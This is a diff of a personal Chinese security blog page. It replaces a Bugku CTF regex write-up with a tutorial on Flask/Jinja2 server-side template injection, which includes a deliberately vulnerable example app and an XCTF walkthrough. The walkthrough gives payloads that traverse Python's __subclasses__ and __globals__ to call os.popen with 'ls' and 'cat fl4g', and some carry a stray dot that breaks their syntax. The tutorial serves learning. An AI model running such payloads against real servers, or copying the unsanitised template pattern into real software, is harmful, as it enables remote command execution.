@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="bugku-web-字符？正则？, charlieputhr的小屋">
+    <meta name="keywords" content="ssti模板注入漏洞, charlieputhr的小屋">
     <meta name="description" content="西科大/计算机学院/信安/咸鱼">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>bugku-web-字符？正则？ | charlieputhr的小屋</title>
+    <title>ssti模板注入漏洞 | charlieputhr的小屋</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/medias/favicon.ico">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -245,12 +245,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/img/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">bugku-web-字符？正则？</h1>
+                    <h1 class="description center-align post-title">ssti模板注入漏洞</h1>
                 </div>
             </div>
         </div>
@@ -367,12 +367,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
-                                <span class="chip bg-color">正则表达式</span>
+                            <a href="/tags/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">ssti模板注入</span>
                             </a>
                         
-                            <a href="/tags/php/">
-                                <span class="chip bg-color">php</span>
+                            <a href="/tags/flask%E6%A1%86%E6%9E%B6/">
+                                <span class="chip bg-color">flask框架</span>
                             </a>
                         
                     </div>
@@ -396,7 +396,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-08-13
+                    2020-09-11
                 </div>
                 
 
@@ -412,66 +412,64 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>一直以为自己还是能看懂稍微简单点的正则表达式，直到遇见这道题，我才知道自己是有多么的垃圾😥</p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/img/%E5%AD%97%E7%AC%A6%E6%AD%A3%E5%88%99%E9%A2%98%E7%9B%AE.png" alt=""></p>
-<p>打开题目直接显示源码</p>
-<p><img src="/img/%E5%AD%97%E7%AC%A6%E6%AD%A3%E5%88%99%E4%BB%A3%E7%A0%81.png" alt=""></p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$key</span><span class="token operator">=</span><span class="token string">'KEY{********************************}'</span><span class="token punctuation">;</span>
-<span class="token variable">$IM</span><span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i"</span><span class="token punctuation">,</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$IM</span> <span class="token punctuation">)</span><span class="token punctuation">{</span> 
- <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'key is: '</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token delimiter">?></span></code></pre>
-<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>直接看关键部分:</p>
-<p><code>preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match)</code></p>
-<ul>
-<li><code>key</code>,在正则表达式里没有特殊字符的都是字符串，所以这里直接匹配key即可,<code>?id=key</code></li>
-</ul>
-<ul>
-<li><code>.</code>，<code>.</code>表示除\n外的任何单字符，所以我们这里匹配任意一个单字符都行，这里选择匹配a，<code>?id=keya</code></li>
-</ul>
-<ul>
-<li><code>*</code>,<code>*</code>匹配前面的表达式零次或多次，这里就是匹配前面<code>.</code>所代表的表达式零次或多次，如果零次则是<code>?id=key</code>,若是1次则<code>?id=keya</code>，匹配两次则是<code>?id=keyaa</code>,这里我选择的是最好理解的一次:<code>?id=keya</code></li>
-</ul>
-<ul>
-<li><code>key</code>，同上面的key一样，再来一次，<code>?id=keyakey</code></li>
-</ul>
-<ul>
-<li><code>.</code>,同上面的一样，<code>?id=keyakeya</code></li>
-</ul>
-<ul>
-<li><code>{4,7}</code>,表示匹配前面的表达式最少4次最多7次，这里表示匹配前面<code>.</code>代表的表达式最少4次最多7次，这里我选择的是匹配4次（简单一点），<code>?id=keyakeyaaaa</code></li>
-</ul>
-<ul>
-<li><code>key</code>,再次同上面的<code>key</code>，<code>?id=keyakeyaaaakey</code></li>
-</ul>
-<ul>
-<li><code>:</code>,匹配一个<code>:</code>,<code>?id=keyakeyaaaakey:</code></li>
-</ul>
-<ul>
-<li><code>\/</code>,<code>\</code>是一个转义符，这里表示的是匹配一个<code>/</code>字符，所以在后面添加一个<code>/</code>即可，<code>?id=keyakeyaaaakey:/</code></li>
-</ul>
-<ul>
-<li><code>.</code>,继续重复，<code>?id=keyakeyaaaakey:/a</code></li>
-</ul>
-<ul>
-<li><code>\/</code>,同上，添加一个<code>/</code>即可，<code>?id=keyakeyaaaakey:/a/</code></li>
-</ul>
-<ul>
-<li><code>(.*key)</code>,表示匹配()里面的整个表达式，<code>.</code>我选择的还是匹配a,<code>*</code>我选择的是匹配1次,然后再匹配一个key,即<code>?id=keyakeyaaaakey:/a/akey</code></li>
-</ul>
-<ul>
-<li><code>[a-z]</code>,匹配a-z中任意的一个字符，我选择的还是匹配a，<code>?id=keyakeyaaaakey:/a/akeya</code></li>
-</ul>
-<ul>
-<li><code>[[:punct:]]</code>,表示的是匹配任意一个标点符号，这里我选择的是<code>~</code>，所以我构造的完整的payload是：<code>?id=keyakeyaaaakey:/a/akeya~</code></li>
-</ul>
-<p>这样我们就得到flag啦</p>
-<p><img src="/img/%E5%AD%97%E7%AC%A6%E6%AD%A3%E5%88%99flag.png" alt=""></p>
-<p>最后附上一篇正则表达式基本语法的博客：</p>
-<p><a href="https://www.runoob.com/regexp/regexp-syntax.html" target="_blank" rel="noopener">https://www.runoob.com/regexp/regexp-syntax.html</a></p>
+                <p>在做题的时候遇到了ssti注入，本来不是很想去学习这个漏洞，因为flask框架是python的，然后我自己python又很辣鸡，最后还是逼了自己去看哈哈哈哈，这里就简单总结一下几位大佬的讲解。</p>
+<h2 id="ssti漏洞成因"><a href="#ssti漏洞成因" class="headerlink" title="ssti漏洞成因"></a>ssti漏洞成因</h2><p>ssti模板注入，实际还是一种注入，漏洞的形成还是由于信任用户的输入以及代码不规范过滤不严。</p>
+<p>我们从一个例子来看：</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
+<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'guest'</span><span class="token punctuation">)</span>
+
+    t <span class="token operator">=</span> Template<span class="token punctuation">(</span><span class="token string">"Hello "</span> <span class="token operator">+</span> name<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> t<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>这里获取用户get传参进来的name参数，将name参数直接传给Template对象进行拼接显示在页面上，并没有对用户的输入进行过滤，随后使用render()进行渲染，render()方法会对用户的输入进行解析，从而导致了ssti注入。</p>
+<h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><p>这里给出几个会用到的魔术方法</p>
+<pre><code>__class__  返回类型所属的对象
+__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
+__bases__   返回该对象所继承的基类
+__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的引用的列表
+__init__  类的初始化方法
+__globals__  对包含函数全局变量的字典的引用</code></pre><h3 id="class"><a href="#class" class="headerlink" title="_class_"></a>_<em>class_</em></h3><p>返回类型所属的对象，就是返回当前数据实例化的类是什么，举几个例子：</p>
+<p><img src="/img/ssti_class_eg.png" alt=""></p>
+<h3 id="bases-及-mro"><a href="#bases-及-mro" class="headerlink" title="_bases__及__mro_\"></a>_<em>bases__及__mro_\</em></h3><p>两者类似，都是获得该类的基类，例子如下：</p>
+<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_base_eg.png" alt=""></p>
+<p>不同的是，__mro__会将本类包含，而___bases__不会将本类包含进去</p>
+<h3 id="subclasses"><a href="#subclasses" class="headerlink" title="_subclasses_()"></a>_<em>subclasses_</em>()</h3><p>查看类中所有存活子类的引用，也就是返回这个类的子类的集合，也就是object类的子类的集合。这里顺便说一下，python2返回的子类和python3是不同的，但python2有的python3也基本都有。</p>
+<h2 id="xctf-web-python-template-injection"><a href="#xctf-web-python-template-injection" class="headerlink" title="xctf_web_python_template_injection"></a>xctf_web_python_template_injection</h2><p>这里就用攻防世界的一个题来作为例子分析一下</p>
+<h3 id="测试是否存在ssti漏洞"><a href="#测试是否存在ssti漏洞" class="headerlink" title="测试是否存在ssti漏洞"></a>测试是否存在ssti漏洞</h3><p>根据题目猜测是一个ssti模板注入漏洞，经过测试发现输入的7*7被执行了，确实存在ssti注入漏洞。</p>
+<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5CQQ%E6%88%AA%E5%9B%BE20200911175112.png" alt=""></p>
+<h3 id="查看类型对象"><a href="#查看类型对象" class="headerlink" title="查看类型对象"></a>查看类型对象</h3><p>接着__class__查看返回的类型的对象</p>
+<p><code>&#39;&#39;.__class__</code></p>
+<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_class.png" alt=""></p>
+<h3 id="获取object基类"><a href="#获取object基类" class="headerlink" title="获取object基类"></a>获取object基类</h3><p>这里我用的是__mro__这个魔术方法</p>
+<p><code>‘’.__class__.__mro__</code></p>
+<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_mro.png" alt=""></p>
+<p>我们可以看到我们要查找的object类对应的索引是2，那么对应的payload就应该是</p>
+<p><code>‘’.__class__.__mro__[2]</code></p>
+<h3 id="获取基类的所有子类"><a href="#获取基类的所有子类" class="headerlink" title="获取基类的所有子类"></a>获取基类的所有子类</h3><p><code>‘’.__class__.__mro__[2].__subclasses__()</code></p>
+<p>这部分是去寻找一个可以执行命令或者读取文件的类，_<em>subclasses_</em>()返回该类的所有子类。</p>
+<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_subclasses.png" alt=""></p>
+<p>我们现在就是要去寻找可以执行命令或者读取文件的类，由于类的数量太多，可以考虑使用脚本来进行判断。这里找的是site._Printer类，是第72个类(所以索引应该是71)</p>
+<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_subclasses_71.png" alt=""></p>
+<h3 id="查看读取文件"><a href="#查看读取文件" class="headerlink" title="查看读取文件"></a>查看读取文件</h3><p><code>‘’.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen.(&#39;ls&#39;).read()</code></p>
+<p>我们可以利用<code>.__init__.__globals__</code>来查找os类下的，<code>__init__</code>初始化类，<code>__globals__</code>全局查找所有的方法、变量、参数。</p>
+<p>在我们全局查找所有的方法时，找到一个可以利用的function popen（这里我利用的是os模块中的popen执行ls来打印所有文件，还有其他很多方法来读取文件，详情可以自行百度）</p>
+<p>发现我们要找的flag文件</p>
+<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_ls.png" alt=""></p>
+<p>将ls命令换成cat命令，即可读取到文件内容</p>
+<p><code>‘’.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen.(&#39;cat fl4g&#39;).read()</code></p>
+<p><img src="D:%5Cpersonal%5Cblog%5Csource%5Cimg%5Cssti_cat.png" alt=""></p>
+<p>该题还有其他的payload，原理都一样。</p>
+<p>参考文章:<a href="https://www.xav1er.top/index.php/archives/20/" target="_blank" rel="noopener">https://www.xav1er.top/index.php/archives/20/</a></p>
+<p>​                <a href="https://www.ebounce.cn/web/19.html" target="_blank" rel="noopener">https://www.ebounce.cn/web/19.html</a></p>
+<p>​                <a href="https://xz.aliyun.com/t/3679#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679#toc-9</a></p>
 
             </div>
             <hr/>
@@ -497,7 +495,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://charlieputhr.cn/2020/08/13/bugku-web-%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99/">http://charlieputhr.cn/2020/08/13/bugku-web-%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99/</a>
+                    <a href="http://charlieputhr.cn/2020/09/11/ssti%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">http://charlieputhr.cn/2020/09/11/ssti%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -535,12 +533,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
-                                    <span class="chip bg-color">正则表达式</span>
+                                <a href="/tags/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">ssti模板注入</span>
                                 </a>
                             
-                                <a href="/tags/php/">
-                                    <span class="chip bg-color">php</span>
+                                <a href="/tags/flask%E6%A1%86%E6%9E%B6/">
+                                    <span class="chip bg-color">flask框架</span>
                                 </a>
                             
                         </div>
@@ -582,9 +580,64 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/09/11/ssti%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="ssti模板注入漏洞">
+                        
+                        <span class="card-title">ssti模板注入漏洞</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            对ssti模板注入漏洞一个浅浅的理解
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Markdown/" class="post-category">
+                                    Markdown
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">ssti模板注入</span>
+                    </a>
+                    
+                    <a href="/tags/flask%E6%A1%86%E6%9E%B6/">
+                        <span class="chip bg-color">flask框架</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2020/09/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
@@ -602,9 +655,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-09-09
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-09
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -622,59 +675,6 @@
                     
                     <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
                         <span class="chip bg-color">文件上传漏洞</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/08/04/Robots%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Robots文件信息泄露">
-                        
-                        <span class="card-title">Robots文件信息泄露</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Robots文件漏洞
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-04
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Markdown/" class="post-category">
-                                    Markdown
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Markdown/">
-                        <span class="chip bg-color">Markdown</span>
-                    </a>
-                    
-                    <a href="/tags/Robots-txt%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
-                        <span class="chip bg-color">Robots.txt信息泄露</span>
                     </a>
                     
                 </div>
